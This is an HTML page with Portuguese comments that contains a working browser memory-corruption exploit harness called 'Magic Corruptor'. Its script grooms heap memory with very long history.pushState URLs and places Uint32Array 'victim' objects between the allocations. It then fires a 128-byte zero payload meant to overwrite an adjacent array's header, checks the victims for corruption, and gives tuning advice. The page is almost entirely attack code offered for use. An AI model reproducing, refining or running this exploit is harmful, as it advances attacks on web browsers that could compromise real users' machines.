<!DOCTYPE html>
<html>
<head>
    <title>Magic Corruptor: Incremental Attack</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .win { color: #ffff00; font-weight: bold; border: 1px solid yellow; padding: 5px; }
    </style>
</head>
<body>

<h1>Magic Corruptor</h1>
<p>Estratégia: Teste 6 (Incremental) + Vítimas Intercaladas + Payload de 128 Bytes</p>

<button onclick="runExploit()">DISPARAR EXPLOIT</button>
<div id="log">Aguardando...</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = []; // Nossos sensores

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : '#00ff00';
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    // Cria payload seguro (0x01 - 0x20) para o grooming
    function makeGroomPayload(size) {
        let s = "";
        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
        return s;
    }

    async function runExploit() {
        log("INICIANDO SEQUÊNCIA MÁGICA REVISADA...", 'win');
        victims = [];

        // FASE 1: O "TESTE 6" MODIFICADO (Incremental com Vítimas)
        log("[1] Crescimento Incremental com Vítimas...");
        
        // Vamos de 1000 até 50000 bytes, como no seu teste original
        for(let size = 1000; size <= 50000; size += 2000) {
            
            // 1. Cria a String de Grooming (History)
            let payload = "/" + "A".repeat(BASE_OFFSET) + makeGroomPayload(size);
            history.pushState({}, `groom_${size}`, payload);
            
            // 2. IMEDIATAMENTE coloca uma vítima atrás dela
            // Tentamos pegar o espaço logo após a string alocada
            let v = new Uint32Array(32); 
            v.fill(0x13371337); // Marcador visível
            v.magic = size; // Pra saber qual iteração criou
            victims.push(v);

            if(size % 10000 === 0) {
                log(`    ...${size} bytes (Vítimas ativas: ${victims.length})`);
                await wait(50); // Pequena pausa pro navegador respirar
            }
        }

        log("[2] Compactando (Teste 3 - Padrões)...");
        // Injeta alguns padrões para forçar alinhamento final
        for(let i=0; i<100; i++) {
             history.pushState({}, `pattern_${i}`, "/" + "A".repeat(BASE_OFFSET) + "\x09\x20".repeat(50));
        }
        
        await wait(1000); // Espera o GC assentar a poeira

        // FASE 3: O ATAQUE DE 128 BYTES
        log("[3] Disparando Ataque de 128 Bytes (Zeros)...", 'win');
        
        // Você confirmou que 128 bytes passa.
        // Isso é suficiente para zerar o Header + os primeiros 24 números do array vítima!
        try {
            let buffer = "A".repeat(BASE_OFFSET);
            let attack = "\x00".repeat(128); // O "Martelo" de zeros
            
            // Dispara várias vezes para garantir
            for(let k=0; k<5; k++) {
                history.pushState({}, `PWN_${k}`, "/" + buffer + attack);
            }
            
            log("    Ataque enviado. Verificando danos...");
            checkCorruption();
            
        } catch(e) {
            log(`[!] Erro no ataque: ${e.message}`);
        }
    }

    function checkCorruption() {
        let success = false;
        
        for(let i=0; i<victims.length; i++) {
            let v = victims[i];
            
            // Se o header for corrompido, o tamanho pode mudar
            if (v.length !== 32) {
                log(`!!! JACKPOT !!! Vítima ${i} (Iteração ${v.magic}) TAMANHO ALTERADO: ${v.length}`, 'win');
                success = true;
                break; // Parar no primeiro sucesso para analisar
            }
            
            // Se o conteúdo for zerado (0x00 em vez de 0x13371337)
            if (v[0] !== 0x13371337) {
                log(`!!! JACKPOT !!! Vítima ${i} (Iteração ${v.magic}) CONTEÚDO ZERADO!`, 'win');
                log(`    Valor lido: 0x${v[0].toString(16)}`, 'win');
                success = true;
                break;
            }
        }

        if(!success) {
            log("[-] Nenhuma corrupção visível. O alinhamento ainda falhou.");
            log("    Sugestão: Tente mudar o incremento (step) de 2000 para 1000.");
        }
    }
</script>
</body>
</html>
